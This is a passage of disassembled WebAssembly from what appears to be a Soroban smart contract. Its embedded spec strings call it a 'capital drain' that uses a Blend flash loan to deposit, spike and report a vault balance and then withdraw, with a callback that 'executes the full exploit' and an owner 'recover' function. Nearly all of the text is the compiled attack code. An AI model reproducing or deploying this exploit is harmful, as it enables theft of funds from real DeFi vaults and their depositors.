                local.get 1
                local.get 6
                local.get 4
                i32.const 48
                i32.add
                i32.const 4
                call 18
                call 4
                drop
                local.get 1
                i32.const 1048641
                i32.const 6
                call 26
                call 5
                call 4
                drop
                i32.const 1048647
                i32.const 7
                call 26
                local.set 6
                local.get 4
                local.get 3
                i64.store
                i64.const 2
                local.set 5
                i32.const 1
                local.set 9
                block ;; label = @7
                  loop ;; label = @8
                    local.get 9
                    i32.eqz
                    br_if 1 (;@7;)
                    local.get 9
                    i32.const -1
                    i32.add
                    local.set 9
                    local.get 3
                    local.set 5
                    br 0 (;@8;)
                  end
                end
                local.get 4
                local.get 5
                i64.store offset=48
                i32.const 1
                local.set 9
                local.get 4
                i32.const 32
                i32.add
                local.get 1
                local.get 6
                local.get 4
                i32.const 48
                i32.add
                i32.const 1
                call 18
                call 27
                local.get 4
                i64.const 0
                i64.const 0
                call 25
                local.tee 6
                i64.store
                i64.const 2
                local.set 5
                block ;; label = @7
                  loop ;; label = @8
                    local.get 9
                    i32.eqz
                    br_if 1 (;@7;)
                    local.get 9
                    i32.const -1
                    i32.add
                    local.set 9
                    local.get 6
                    local.set 5
                    br 0 (;@8;)
                  end
                end
                local.get 4
                local.get 5
                i64.store offset=48
                local.get 4
                i32.const 48
                i32.add
                i32.const 1
                call 18
                local.set 5
                i32.const 1048654
                i32.const 8
                call 26
                local.set 6
                local.get 4
                i64.load offset=32
                local.get 4
                i64.load offset=40
                call 25
                local.set 10
                local.get 4
                local.get 3
                i64.store offset=16
                local.get 4
                local.get 5
                i64.store offset=8
                local.get 4
                local.get 10
                i64.store
                i32.const 0
                local.set 9
                loop ;; label = @7
                  block ;; label = @8
                    local.get 9
                    i32.const 24
                    i32.ne
                    br_if 0 (;@8;)
                    i32.const 0
                    local.set 9
                    block ;; label = @9
                      loop ;; label = @10
                        local.get 9
                        i32.const 24
                        i32.eq
                        br_if 1 (;@9;)
                        local.get 4
                        i32.const 48
                        i32.add
                        local.get 9
                        i32.add
                        local.get 4
                        local.get 9
                        i32.add
                        i64.load
                        i64.store
                        local.get 9
                        i32.const 8
                        i32.add
                        local.set 9
                        br 0 (;@10;)
                      end
                    end
                    local.get 1
                    local.get 6
                    local.get 4
                    i32.const 48
                    i32.add
                    i32.const 3
                    call 18
                    call 4
                    drop
                    local.get 4
                    i32.const 48
                    i32.add
                    local.get 2
                    local.get 3
                    call 22
                    local.get 4
                    i64.load offset=56
                    local.tee 5
                    local.get 7
                    i64.xor
                    local.get 5
                    local.get 5
                    local.get 7
                    i64.sub
                    local.get 4
                    i64.load offset=48
                    local.tee 6
                    local.get 8
                    i64.lt_u
                    i64.extend_i32_u
                    i64.sub
                    local.tee 1
                    i64.xor
                    i64.and
                    i64.const 0
                    i64.lt_s
                    br_if 4 (;@4;)
                    local.get 6
                    local.get 8
                    i64.sub
                    local.set 7
                    block ;; label = @9
                      local.get 6
                      i64.const 0
                      i64.ne
                      local.get 5
                      i64.const 0
                      i64.gt_s
                      local.get 5
                      i64.eqz
                      select
                      i32.eqz
                      br_if 0 (;@9;)
                      local.get 2
                      local.get 3
                      local.get 0
                      local.get 6
                      local.get 5
                      call 28
                    end
                    local.get 7
                    local.get 1
                    call 25
                    local.set 3
                    local.get 4
                    i32.const 80
                    i32.add
                    global.set 0
                    local.get 3
                    return
                  end
                  local.get 4
                  i32.const 48
                  i32.add
                  local.get 9
                  i32.add
                  i64.const 2
                  i64.store
                  local.get 9
                  i32.const 8
                  i32.add
                  local.set 9
                  br 0 (;@7;)
                end
              end
              local.get 4
              i32.const 48
              i32.add
              local.get 9
              i32.add
              i64.const 2
              i64.store
              local.get 9
              i32.const 8
              i32.add
              local.set 9
              br 0 (;@5;)
            end
          end
          call 29
          unreachable
        end
        i32.const 39
        call 30
        unreachable
      end
      call 31
      unreachable
    end
    unreachable
  )
  (func (;35;) (type 7) (param i64 i64 i64 i64 i64 i64) (result i64)
    (local i32 i64 i64 i32 i32 i64)
    global.get 0
    i32.const 80
    i32.sub
    local.tee 6
    global.set 0
    block ;; label = @1
      block ;; label = @2
        local.get 0
        i64.const 255
        i64.and
        i64.const 77
        i64.ne
        br_if 0 (;@2;)
        local.get 1
        i64.const 255
        i64.and
        i64.const 77
        i64.ne
        br_if 0 (;@2;)
        local.get 2
        i64.const 255
        i64.and
        i64.const 77
        i64.ne
        br_if 0 (;@2;)
        local.get 3
        i64.const 255
        i64.and
        i64.const 77
        i64.ne
        br_if 0 (;@2;)
        local.get 6
        i32.const 48
        i32.add
        local.get 4
        call 20
        local.get 6
        i32.load offset=48
        i32.const 1
        i32.eq
        br_if 0 (;@2;)
        local.get 6
        i64.load offset=72
        local.set 4
        local.get 6
        i64.load offset=64
        local.set 7
        local.get 6
        i32.const 48
        i32.add
        local.get 5
        call 20
        local.get 6
        i32.load offset=48
        i32.const 1
        i32.eq
        br_if 0 (;@2;)
        local.get 6
        i64.load offset=72
        local.set 5
        local.get 6
        i64.load offset=64
        local.set 8
        call 3
        local.set 0
        call 23
        local.tee 9
        i32.const -1001
        i32.gt_u
        br_if 1 (;@1;)
        local.get 2
        local.get 0
        local.get 1
        local.get 7
        local.get 4
        local.get 9
        i32.const 1000
        i32.add
        local.tee 10
        call 24
        local.get 6
        local.get 7
        local.get 4
        call 25
        local.tee 7
        i64.store offset=16
        i64.const 2
        local.set 4
        i32.const 1
        local.set 9
        block ;; label = @3
          loop ;; label = @4
            local.get 9
            i32.eqz
            br_if 1 (;@3;)
            local.get 9
            i32.const -1
            i32.add
            local.set 9
            local.get 7
            local.set 4
            br 0 (;@4;)
          end
        end
        local.get 6
        local.get 4
        i64.store offset=48
        i32.const 1
        local.set 9
        local.get 6
        i32.const 48
        i32.add
        i32.const 1
        call 18
        local.set 11
        local.get 6
        i64.const 0
        i64.const 0
        call 25
        local.tee 7
        i64.store offset=16
        i64.const 2
        local.set 4
        block ;; label = @3
          loop ;; label = @4
            local.get 9
            i32.eqz
            br_if 1 (;@3;)
            local.get 9
            i32.const -1
            i32.add
            local.set 9
            local.get 7
            local.set 4
            br 0 (;@4;)
          end
        end
        local.get 6
        local.get 4
        i64.store offset=48
        local.get 6
        i32.const 48
        i32.add
        i32.const 1
        call 18
        local.set 4
        i32.const 1048634
        i32.const 7
        call 26
        local.set 7
        local.get 6
        i64.const 0
        i64.store offset=40
        local.get 6
        local.get 0
        i64.store offset=32
        local.get 6
        local.get 4
        i64.store offset=24
        local.get 6
        local.get 11
        i64.store offset=16
        i32.const 0
        local.set 9
        loop ;; label = @3
          block ;; label = @4
            local.get 9
            i32.const 32
            i32.ne
            br_if 0 (;@4;)
            i32.const 0
            local.set 9
            block ;; label = @5
              loop ;; label = @6
                local.get 9
                i32.const 32
                i32.eq
                br_if 1 (;@5;)
                local.get 6
                i32.const 48
                i32.add
                local.get 9
                i32.add
                local.get 6
                i32.const 16
                i32.add
                local.get 9
                i32.add
                i64.load
                i64.store
                local.get 9
                i32.const 8
                i32.add
                local.set 9
                br 0 (;@6;)
              end
            end
            local.get 1
            local.get 7
            local.get 6
            i32.const 48
            i32.add
            i32.const 4
            call 18
            call 4
            drop
            local.get 2
            local.get 0
            local.get 3
            local.get 8
            local.get 5
            local.get 10
            call 24
            i32.const 1048662
            i32.const 6
            call 26
            local.set 4
            local.get 6
            local.get 8
            local.get 5
            call 25
            i64.store offset=40
            local.get 6
            local.get 2
            i64.store offset=32
            local.get 6
            local.get 0
            i64.store offset=24
            local.get 6
            local.get 0
            i64.store offset=16
            i32.const 0
            local.set 9
            loop ;; label = @5
              block ;; label = @6
                local.get 9
                i32.const 32
                i32.ne
                br_if 0 (;@6;)
                i32.const 0
                local.set 9
                block ;; label = @7
                  loop ;; label = @8
                    local.get 9
                    i32.const 32
                    i32.eq
                    br_if 1 (;@7;)
                    local.get 6
                    i32.const 48
                    i32.add
                    local.get 9
                    i32.add
                    local.get 6
                    i32.const 16
                    i32.add
                    local.get 9
                    i32.add
                    i64.load
                    i64.store
                    local.get 9
                    i32.const 8
                    i32.add
                    local.set 9
                    br 0 (;@8;)
                  end
                end
                local.get 3
                local.get 4
                local.get 6
                i32.const 48
                i32.add
                i32.const 4
                call 18
                call 4
                drop
                local.get 1
                i32.const 1048641
                i32.const 6
                call 26
                call 5
                call 4
                drop
                i32.const 1048647
                i32.const 7
                call 26
                local.set 7
                local.get 6
                local.get 0
                i64.store offset=16
                i64.const 2
                local.set 4
                i32.const 1
                local.set 9
                block ;; label = @7
                  loop ;; label = @8
                    local.get 9
                    i32.eqz
                    br_if 1 (;@7;)
                    local.get 9
                    i32.const -1
                    i32.add
                    local.set 9
                    local.get 0
                    local.set 4
                    br 0 (;@8;)
                  end
                end
                local.get 6
                local.get 4
                i64.store offset=48
                i32.const 1
                local.set 9
                local.get 6
                local.get 1
                local.get 7
                local.get 6
                i32.const 48
                i32.add
                i32.const 1
                call 18
                call 27
                local.get 6
                i64.const 0
                i64.const 0
                call 25
                local.tee 7
                i64.store offset=16
                i64.const 2
                local.set 4
                block ;; label = @7
                  loop ;; label = @8
                    local.get 9
                    i32.eqz
                    br_if 1 (;@7;)
                    local.get 9
                    i32.const -1
                    i32.add
                    local.set 9
                    local.get 7
                    local.set 4
                    br 0 (;@8;)
                  end
                end
                local.get 6
                local.get 4
                i64.store offset=48
                local.get 6
                i32.const 48
                i32.add
                i32.const 1
                call 18
                local.set 4
                i32.const 1048654
                i32.const 8
                call 26
                local.set 7
                local.get 6
                i64.load
                local.get 6
                i64.load offset=8
                call 25
                local.set 11
                local.get 6
                local.get 0
                i64.store offset=32
                local.get 6
                local.get 4
                i64.store offset=24
                local.get 6
                local.get 11
                i64.store offset=16
                i32.const 0
                local.set 9
                loop ;; label = @7
                  block ;; label = @8
                    local.get 9
                    i32.const 24
                    i32.ne
                    br_if 0 (;@8;)
                    i32.const 0
                    local.set 9
                    block ;; label = @9
                      loop ;; label = @10
                        local.get 9
                        i32.const 24
                        i32.eq
                        br_if 1 (;@9;)
                        local.get 6
                        i32.const 48
                        i32.add
                        local.get 9
                        i32.add
                        local.get 6
                        i32.const 16
                        i32.add
                        local.get 9
                        i32.add
                        i64.load
                        i64.store
                        local.get 9
                        i32.const 8
                        i32.add
                        local.set 9
                        br 0 (;@10;)
                      end
                    end
                    local.get 1
                    local.get 7
                    local.get 6
                    i32.const 48
                    i32.add
                    i32.const 3
                    call 18
                    call 4
                    drop
                    i32.const 1048654
                    i32.const 8
                    call 26
                    local.set 4
                    local.get 8
                    local.get 5
                    call 25
                    local.set 7
                    local.get 6
                    local.get 0
                    i64.store offset=40
                    local.get 6
                    local.get 7
                    i64.store offset=32
                    local.get 6
                    local.get 2
                    i64.store offset=24
                    local.get 6
                    local.get 0
                    i64.store offset=16
                    i32.const 0
                    local.set 9
                    loop ;; label = @9
                      block ;; label = @10
                        local.get 9
                        i32.const 32
                        i32.ne
                        br_if 0 (;@10;)
                        i32.const 0
                        local.set 9
                        block ;; label = @11
                          loop ;; label = @12
                            local.get 9
                            i32.const 32
                            i32.eq
                            br_if 1 (;@11;)
                            local.get 6
                            i32.const 48
                            i32.add
                            local.get 9
                            i32.add
                            local.get 6
                            i32.const 16
                            i32.add
                            local.get 9
                            i32.add
                            i64.load
                            i64.store
                            local.get 9
                            i32.const 8
                            i32.add
                            local.set 9
                            br 0 (;@12;)
                          end
                        end
                        local.get 3
                        local.get 4
                        local.get 6
                        i32.const 48
                        i32.add
                        i32.const 4
                        call 18
                        call 4
                        drop
                        local.get 6
                        i32.const 80
                        i32.add
                        global.set 0
                        i64.const 2
                        return
                      end
                      local.get 6
                      i32.const 48
                      i32.add
                      local.get 9
                      i32.add
                      i64.const 2
                      i64.store
                      local.get 9
                      i32.const 8
                      i32.add
                      local.set 9
                      br 0 (;@9;)
                    end
                  end
                  local.get 6
                  i32.const 48
                  i32.add
                  local.get 9
                  i32.add
                  i64.const 2
                  i64.store
                  local.get 9
                  i32.const 8
                  i32.add
                  local.set 9
                  br 0 (;@7;)
                end
              end
              local.get 6
              i32.const 48
              i32.add
              local.get 9
              i32.add
              i64.const 2
              i64.store
              local.get 9
              i32.const 8
              i32.add
              local.set 9
              br 0 (;@5;)
            end
          end
          local.get 6
          i32.const 48
          i32.add
          local.get 9
          i32.add
          i64.const 2
          i64.store
          local.get 9
          i32.const 8
          i32.add
          local.set 9
          br 0 (;@3;)
        end
      end
      unreachable
    end
    call 29
    unreachable
  )
  (func (;36;) (type 1) (param i64) (result i64)
    block ;; label = @1
      local.get 0
      i64.const 255
      i64.and
      i64.const 77
      i64.eq
      br_if 0 (;@1;)
      unreachable
    end
    local.get 0
    call 2
    drop
    call 16
    local.get 0
    i64.const 2
    call 7
    drop
    i64.const 2
  )
  (func (;37;) (type 0) (param i64 i64) (result i64)
    (local i32 i64 i64 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 2
    global.set 0
    block ;; label = @1
      block ;; label = @2
        block ;; label = @3
          local.get 0
          i64.const 255
          i64.and
          i64.const 77
          i64.ne
          br_if 0 (;@3;)
          local.get 1
          i64.const 255
          i64.and
          i64.const 77
          i64.ne
          br_if 0 (;@3;)
          local.get 0
          call 2
          drop
          local.get 2
          call 15
          local.get 2
          i32.load
          i32.eqz
          br_if 1 (;@2;)
          local.get 0
          local.get 2
          i64.load offset=8
          call 21
          i32.eqz
          br_if 2 (;@1;)
          local.get 2
          local.get 1
          call 3
          local.tee 3
          call 22
          block ;; label = @4
            local.get 2
            i64.load
            local.tee 4
            i64.eqz
            local.get 2
            i64.load offset=8
            local.tee 5
            i64.const 0
            i64.lt_s
            local.get 5
            i64.eqz
            select
            br_if 0 (;@4;)
            local.get 1
            local.get 3
            local.get 0
            local.get 4
            local.get 5
            call 28
          end
          local.get 4
          local.get 5
          call 25
          local.set 0
          local.get 2
          i32.const 16
          i32.add
          global.set 0
          local.get 0
          return
        end
        unreachable
      end
      call 31
      unreachable
    end
    i32.const 39
    call 30
    unreachable
  )
  (func (;38;) (type 15)
    unreachable
  )
  (func (;39;) (type 15))
  (func (;40;) (type 18) (param i64 i64 i64)
    block ;; label = @1
      local.get 0
      local.get 1
      local.get 2
      call 4
      i64.const 255
      i64.and
      i64.const 2
      i64.eq
      br_if 0 (;@1;)
      call 29
      unreachable
    end
  )
  (func (;41;) (type 19) (param i32 i64 i64 i32)
    (local i64)
    block ;; label = @1
      block ;; label = @2
        local.get 3
        i32.const 64
        i32.and
        br_if 0 (;@2;)
        local.get 3
        i32.eqz
        br_if 1 (;@1;)
        local.get 2
        local.get 3
        i32.const 63
        i32.and
        i64.extend_i32_u
        local.tee 4
        i64.shl
        local.get 1
        i32.const 0
        local.get 3
        i32.sub
        i32.const 63
        i32.and
        i64.extend_i32_u
        i64.shr_u
        i64.or
        local.set 2
        local.get 1
        local.get 4
        i64.shl
        local.set 1
        br 1 (;@1;)
      end
      local.get 1
      local.get 3
      i32.const 63
      i32.and
      i64.extend_i32_u
      i64.shl
      local.set 2
      i64.const 0
      local.set 1
    end
    local.get 0
    local.get 1
    i64.store
    local.get 0
    local.get 2
    i64.store offset=8
  )
  (func (;42;) (type 20) (param i32 i64 i64 i64 i64)
    (local i32 i64 i32 i32 i32 i64 i64 i64 i64)
    global.get 0
    i32.const 176
    i32.sub
    local.tee 5
    global.set 0
    i64.const 0
    local.set 6
    block ;; label = @1
      block ;; label = @2
        block ;; label = @3
          block ;; label = @4
            local.get 4
            i64.clz
            local.get 3
            i64.clz
            i64.const 64
            i64.add
            local.get 4
            i64.const 0
            i64.ne
            select
            i32.wrap_i64
            local.tee 7
            local.get 2
            i64.clz
            local.get 1
            i64.clz
            i64.const 64
            i64.add
            local.get 2
            i64.const 0
            i64.ne
            select
            i32.wrap_i64
            local.tee 8
            i32.le_u
            br_if 0 (;@4;)
            local.get 8
            i32.const 63
            i32.gt_u
            br_if 1 (;@3;)
            local.get 7
            i32.const 95
            i32.gt_u
            br_if 2 (;@2;)
            block ;; label = @5
              block ;; label = @6
                block ;; label = @7
                  local.get 7
                  local.get 8
                  i32.sub
                  i32.const 32
                  i32.lt_u
                  br_if 0 (;@7;)
                  local.get 5
                  i32.const 160
                  i32.add
                  local.get 3
                  local.get 4
                  i32.const 96
                  local.get 7
                  i32.sub
                  local.tee 9
                  call 45
                  local.get 5
                  i64.load32_u offset=160
                  i64.const 1
                  i64.add
                  local.set 10
                  i64.const 0
                  local.set 11
                  i64.const 0
                  local.set 6
                  br 1 (;@6;)
                end
                local.get 5
                i32.const 48
                i32.add
                local.get 1
                local.get 2
                i32.const 64
                local.get 8
                i32.sub
                local.tee 8
                call 45
                local.get 5
                i32.const 32
                i32.add
                local.get 3
                local.get 4
                local.get 8
                call 45
                i64.const 0
                local.set 6
                local.get 5
                local.get 3
                i64.const 0
                local.get 5
                i64.load offset=48
                local.get 5
                i64.load offset=32
                i64.div_u
                local.tee 12
                i64.const 0
                call 44
                local.get 5
                i32.const 16
                i32.add
                local.get 4
                i64.const 0
                local.get 12
                i64.const 0
                call 44
                local.get 5
                i64.load
                local.set 10
                block ;; label = @7
                  local.get 5
                  i64.load offset=24
                  local.get 5
                  i64.load offset=8
                  local.tee 13
                  local.get 5
                  i64.load offset=16
                  i64.add
                  local.tee 11
                  local.get 13
                  i64.lt_u
                  i64.extend_i32_u
                  i64.add
                  i64.const 0
                  i64.ne
                  br_if 0 (;@7;)
                  local.get 1
                  local.get 10
                  i64.lt_u
                  local.tee 8
                  local.get 2
                  local.get 11
                  i64.lt_u
                  local.get 2
                  local.get 11
                  i64.eq
                  select
                  i32.eqz
                  br_if 2 (;@5;)
                end
                local.get 4
                local.get 2
                i64.add
                local.get 3
                local.get 1
                i64.add
                local.tee 1
                local.get 3
                i64.lt_u
                i64.extend_i32_u
                i64.add
                local.get 11
                i64.sub
                local.get 1
                local.get 10
                i64.lt_u
                i64.extend_i32_u
                i64.sub
                local.set 2
                local.get 12
                i64.const -1
                i64.add
                local.set 12
                local.get 1
                local.get 10
                i64.sub
                local.set 1
                br 5 (;@1;)
              end
              block ;; label = @6
                block ;; label = @7
                  loop ;; label = @8
                    local.get 5
                    i32.const 144
                    i32.add
                    local.get 1
                    local.get 2
                    i32.const 64
                    local.get 8
                    i32.sub
                    local.tee 8
                    call 45
                    local.get 5
                    i64.load offset=144
                    local.set 12
                    block ;; label = @9
                      local.get 8
                      local.get 9
                      i32.ge_u
                      br_if 0 (;@9;)
                      local.get 5
                      i32.const 80
                      i32.add
                      local.get 3
                      local.get 4
                      local.get 8
                      call 45
                      local.get 5
                      i32.const 64
                      i32.add
                      local.get 3
                      local.get 4
                      local.get 12
                      local.get 5
                      i64.load offset=80
                      i64.div_u
                      local.tee 13
                      i64.const 0
                      call 44
                      block ;; label = @10
                        local.get 1
                        local.get 5
                        i64.load offset=64
                        local.tee 10
                        i64.lt_u
                        local.tee 8
                        local.get 2
                        local.get 5
                        i64.load offset=72
                        local.tee 12
                        i64.lt_u
                        local.get 2
                        local.get 12
                        i64.eq
                        select
                        br_if 0 (;@10;)
                        local.get 2
                        local.get 12
                        i64.sub
                        local.get 8
                        i64.extend_i32_u
                        i64.sub
                        local.set 2
                        local.get 1
                        local.get 10
                        i64.sub
                        local.set 1
                        local.get 6
                        local.get 11
                        local.get 13
                        i64.add
                        local.tee 12
                        local.get 11
                        i64.lt_u
                        i64.extend_i32_u
                        i64.add
                        local.set 6
                        br 9 (;@1;)
                      end
                      local.get 2
                      local.get 4
                      i64.add
                      local.get 1
                      local.get 3
                      i64.add
                      local.tee 4
                      local.get 1
                      i64.lt_u
                      i64.extend_i32_u
                      i64.add
                      local.get 12
                      i64.sub
                      local.get 4
                      local.get 10
                      i64.lt_u
                      i64.extend_i32_u
                      i64.sub
                      local.set 2
                      local.get 4
                      local.get 10
                      i64.sub
                      local.set 1
                      local.get 6
                      local.get 13
                      local.get 11
                      i64.add
                      i64.const -1
                      i64.add
                      local.tee 12
                      local.get 11
                      i64.lt_u
                      i64.extend_i32_u
                      i64.add
                      local.set 6
                      br 8 (;@1;)
                    end
                    local.get 5
                    i32.const 128
                    i32.add
                    local.get 12
                    local.get 10
                    i64.div_u
                    local.tee 12
                    i64.const 0
                    local.get 8
                    local.get 9
                    i32.sub
                    local.tee 8
                    call 41
                    local.get 5
                    i32.const 112
                    i32.add
                    local.get 3
                    local.get 4
                    local.get 12
                    i64.const 0
                    call 44
                    local.get 5
                    i32.const 96
                    i32.add
                    local.get 5
                    i64.load offset=112
                    local.get 5
                    i64.load offset=120
                    local.get 8
                    call 41
                    local.get 5
                    i64.load offset=136
                    local.get 6
                    i64.add
                    local.get 5
                    i64.load offset=128
                    local.tee 6
                    local.get 11
                    i64.add
                    local.tee 11
                    local.get 6
                    i64.lt_u
                    i64.extend_i32_u
                    i64.add
                    local.set 6
                    block ;; label = @9
                      local.get 7
                      local.get 2
                      local.get 5
                      i64.load offset=104
                      i64.sub
                      local.get 1
                      local.get 5
                      i64.load offset=96
                      local.tee 12
                      i64.lt_u
                      i64.extend_i32_u
                      i64.sub
                      local.tee 2
                      i64.clz
                      local.get 1
                      local.get 12
                      i64.sub
                      local.tee 1
                      i64.clz
                      i64.const 64
                      i64.add
                      local.get 2
                      i64.const 0
                      i64.ne
                      select
                      i32.wrap_i64
                      local.tee 8
                      i32.le_u
                      br_if 0 (;@9;)
                      local.get 8
                      i32.const 63
                      i32.gt_u
                      br_if 2 (;@7;)
                      br 1 (;@8;)
                    end
                  end
                  local.get 1
                  local.get 3
                  i64.lt_u
                  local.tee 8
                  local.get 2
                  local.get 4
                  i64.lt_u
                  local.get 2
                  local.get 4
                  i64.eq
                  select
                  i32.eqz
                  br_if 1 (;@6;)
                  local.get 11
                  local.set 12
                  br 6 (;@1;)
                end
                local.get 1
                local.get 1
                local.get 3
                i64.div_u
                local.tee 2
                local.get 3
                i64.mul
                i64.sub
                local.set 1
                local.get 6
                local.get 11
                local.get 2
                i64.add
                local.tee 12
                local.get 11
                i64.lt_u
                i64.extend_i32_u
                i64.add
                local.set 6
                i64.const 0
                local.set 2
                br 5 (;@1;)
              end
              local.get 2
              local.get 4
              i64.sub
              local.get 8
              i64.extend_i32_u
              i64.sub
              local.set 2
              local.get 1
              local.get 3
              i64.sub
              local.set 1
              local.get 6
              local.get 11
              i64.const 1
              i64.add
              local.tee 12
              i64.eqz
              i64.extend_i32_u
              i64.add
              local.set 6
              br 4 (;@1;)
            end
            local.get 2
            local.get 11
            i64.sub
            local.get 8
            i64.extend_i32_u
            i64.sub
            local.set 2
            local.get 1
            local.get 10
            i64.sub
            local.set 1
            i64.const 0
            local.set 6
            br 3 (;@1;)
          end
          local.get 2
          local.get 4
          i64.const 0
          local.get 1
          local.get 3
          i64.ge_u
          local.get 2
          local.get 4
          i64.ge_u
          local.get 2
          local.get 4
          i64.eq
          select
          local.tee 8
          select
          i64.sub
          local.get 1
          local.get 3
          i64.const 0
          local.get 8
          select
          local.tee 4
          i64.lt_u
          i64.extend_i32_u
          i64.sub
          local.set 2
          local.get 1
          local.get 4
          i64.sub
          local.set 1
          local.get 8
          i64.extend_i32_u
          local.set 12
          br 2 (;@1;)
        end
        local.get 1
        local.get 1
        local.get 3
        i64.div_u
        local.tee 12
        local.get 3
        i64.mul
        i64.sub
        local.set 1
        i64.const 0
        local.set 6
        i64.const 0
        local.set 2
        br 1 (;@1;)
      end
      local.get 2
      local.get 2
      local.get 3
      i64.const 4294967295
      i64.and
      local.tee 4
      i64.div_u
      local.tee 6
      local.get 3
      i64.mul
      i64.sub
      i64.const 32
      i64.shl
      local.get 1
      i64.const 32
      i64.shr_u
      local.tee 12
      i64.or
      local.get 4
      i64.div_u
      local.tee 2
      i64.const 32
      i64.shl
      local.get 12
      local.get 2
      local.get 3
      i64.mul
      i64.sub
      i64.const 32
      i64.shl
      local.get 1
      i64.const 4294967295
      i64.and
      i64.or
      local.tee 1
      local.get 4
      i64.div_u
      local.tee 3
      i64.or
      local.set 12
      local.get 1
      local.get 3
      local.get 4
      i64.mul
      i64.sub
      local.set 1
      local.get 2
      i64.const 32
      i64.shr_u
      local.get 6
      i64.or
      local.set 6
      i64.const 0
      local.set 2
    end
    local.get 0
    local.get 1
    i64.store offset=16
    local.get 0
    local.get 12
    i64.store
    local.get 0
    local.get 2
    i64.store offset=24
    local.get 0
    local.get 6
    i64.store offset=8
    local.get 5
    i32.const 176
    i32.add
    global.set 0
  )
  (func (;43;) (type 20) (param i32 i64 i64 i64 i64)
    (local i32 i32)
    global.get 0
    i32.const 32
    i32.sub
    local.tee 5
    global.set 0
    local.get 5
    i64.const 0
    local.get 1
    i64.sub
    local.get 1
    local.get 2
    i64.const 0
    i64.lt_s
    local.tee 6
    select
    i64.const 0
    local.get 2
    local.get 1
    i64.const 0
    i64.ne
    i64.extend_i32_u
    i64.add
    i64.sub
    local.get 2
    local.get 6
    select
    i64.const 0
    local.get 3
    i64.sub
    local.get 3
    local.get 4
    i64.const 0
    i64.lt_s
    local.tee 6
    select
    i64.const 0
    local.get 4
    local.get 3
    i64.const 0
    i64.ne
    i64.extend_i32_u
    i64.add
    i64.sub
    local.get 4
    local.get 6
    select
    call 42
    local.get 5
    i64.load offset=8
    local.set 3
    local.get 0
    i64.const 0
    local.get 5
    i64.load
    local.tee 1
    i64.sub
    local.get 1
    local.get 4
    local.get 2
    i64.xor
    i64.const 0
    i64.lt_s
    local.tee 6
    select
    i64.store
    local.get 0
    i64.const 0
    local.get 3
    local.get 1
    i64.const 0
    i64.ne
    i64.extend_i32_u
    i64.add
    i64.sub
    local.get 3
    local.get 6
    select
    i64.store offset=8
    local.get 5
    i32.const 32
    i32.add
    global.set 0
  )
  (func (;44;) (type 20) (param i32 i64 i64 i64 i64)
    (local i64 i64 i64 i64 i64 i64)
    local.get 0
    local.get 3
    i64.const 4294967295
    i64.and
    local.tee 5
    local.get 1
    i64.const 4294967295
    i64.and
    local.tee 6
    i64.mul
    local.tee 7
    local.get 3
    i64.const 32
    i64.shr_u
    local.tee 8
    local.get 6
    i64.mul
    local.tee 6
    local.get 5
    local.get 1
    i64.const 32
    i64.shr_u
    local.tee 9
    i64.mul
    i64.add
    local.tee 5
    i64.const 32
    i64.shl
    i64.add
    local.tee 10
    i64.store
    local.get 0
    local.get 8
    local.get 9
    i64.mul
    local.get 5
    local.get 6
    i64.lt_u
    i64.extend_i32_u
    i64.const 32
    i64.shl
    local.get 5
    i64.const 32
    i64.shr_u
    i64.or
    i64.add
    local.get 10
    local.get 7
    i64.lt_u
    i64.extend_i32_u
    i64.add
    local.get 4
    local.get 1
    i64.mul
    local.get 3
    local.get 2
    i64.mul
    i64.add
    i64.add
    i64.store offset=8
  )
  (func (;45;) (type 19) (param i32 i64 i64 i32)
    (local i64)
    block ;; label = @1
      block ;; label = @2
        local.get 3
        i32.const 64
        i32.and
        br_if 0 (;@2;)
        local.get 3
        i32.eqz
        br_if 1 (;@1;)
        local.get 2
        i32.const 0
        local.get 3
        i32.sub
        i32.const 63
        i32.and
        i64.extend_i32_u
        i64.shl
        local.get 1
        local.get 3
        i32.const 63
        i32.and
        i64.extend_i32_u
        local.tee 4
        i64.shr_u
        i64.or
        local.set 1
        local.get 2
        local.get 4
        i64.shr_u
        local.set 2
        br 1 (;@1;)
      end
      local.get 2
      local.get 3
      i32.const 63
      i32.and
      i64.extend_i32_u
      i64.shr_u
      local.set 1
      i64.const 0
      local.set 2
    end
    local.get 0
    local.get 1
    i64.store
    local.get 0
    local.get 2
    i64.store offset=8
  )
  (data (;0;) (i32.const 1048576) "Owneramountassetcontract\05\00\10\00\06\00\00\00\0b\00\10\00\05\00\00\00\10\00\10\00\08\00\00\00flash_loandepositreportbalancewithdrawsupply")
  (@custom "contractspecv0" (after data) "\00\00\00\00\00\00\005Capital drain \e2\80\94 deposit + spike + report + withdraw\00\00\00\00\00\00\05drain\00\00\00\00\00\00\06\00\00\00\00\00\00\00\05owner\00\00\00\00\00\00\13\00\00\00\00\00\00\00\05vault\00\00\00\00\00\00\13\00\00\00\00\00\00\00\0atoken_addr\00\00\00\00\00\13\00\00\00\00\00\00\00\0ablend_pool\00\00\00\00\00\13\00\00\00\00\00\00\00\0edeposit_amount\00\00\00\00\00\0b\00\00\00\00\00\00\00\0cspike_amount\00\00\00\0b\00\00\00\01\00\00\00\0b\00\00\00\00\00\00\00aBlend flash loan callback \e2\80\94 Blend calls this during flash_loan\0aWe execute the full exploit here\00\00\00\00\00\00\07exec_op\00\00\00\00\06\00\00\00\00\00\00\00\05_from\00\00\00\00\00\00\13\00\00\00\00\00\00\00\05vault\00\00\00\00\00\00\13\00\00\00\00\00\00\00\0atoken_addr\00\00\00\00\00\13\00\00\00\00\00\00\00\0ablend_pool\00\00\00\00\00\13\00\00\00\00\00\00\00\0edeposit_amount\00\00\00\00\00\0b\00\00\00\00\00\00\00\0cspike_amount\00\00\00\0b\00\00\00\00\00\00\00\00\00\00\00\0eRecover tokens\00\00\00\00\00\07recover\00\00\00\00\02\00\00\00\00\00\00\00\05owner\00\00\00\00\00\00\13\00\00\00\00\00\00\00\0atoken_addr\00\00\00\00\00\13\00\00\00\01\00\00\00\0b\00\00\00\02\00\00\00\00\00\00\00\00\00\00\00\07DataKey\00\00\00\00\01\00\00\00\00\00\00\00\00\00\00\00\05Owner\00\00\00\00\00\00\01\00\00\00\14Blend request struct\00\00\00\00\00\00\00\07Request\00\00\00\00\03\00\00\00\00\00\00\00\07address\00\00\00\00\13\00\00\00\00\00\00\00\06amount\00\00\00\00\00\0b\00\00\00\00\00\00\00\0crequest_type\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\0ainitialize\00\00\00\00\00\01\00\00\00\00\00\00\00\05owner\00\00\00\00\00\00\13\00\00\00\00\00\00\00\00\00\00\00-Flash loan drain using Blend \e2\80\94 zero 